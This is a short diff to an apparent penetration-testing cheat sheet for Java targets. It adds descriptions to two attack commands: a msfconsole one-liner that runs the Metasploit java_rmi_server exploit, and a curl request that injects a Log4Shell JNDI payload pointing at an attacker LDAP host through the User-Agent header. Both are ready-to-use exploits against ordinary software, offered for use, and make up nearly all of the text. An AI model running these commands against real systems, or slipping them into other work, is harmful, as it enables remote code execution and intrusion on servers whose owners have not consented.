@@ -6,6 +6,8 @@
 
 Start RMI metasploit module with Java.
 
+Use the Metasploit Java RMI server module.
+
 ```sh title:"Java Start RMI Metasploit Module"
 msfconsole -x "use exploit/multi/misc/java_rmi_server; run; exit"
 ```
@@ -14,6 +16,8 @@ msfconsole -x "use exploit/multi/misc/java_rmi_server; run; exit"
 ### Log4Shell User-Agent probe
 
 Probe Log4Shell user agent probe with Java.
+
+Send a JNDI lookup string in the User-Agent header.
 
 ```sh title:"Java Probe Log4Shell User Agent Probe"
 curl -H 'User-Agent: ${jndi:ldap://$lhost:$lport}' "$url"
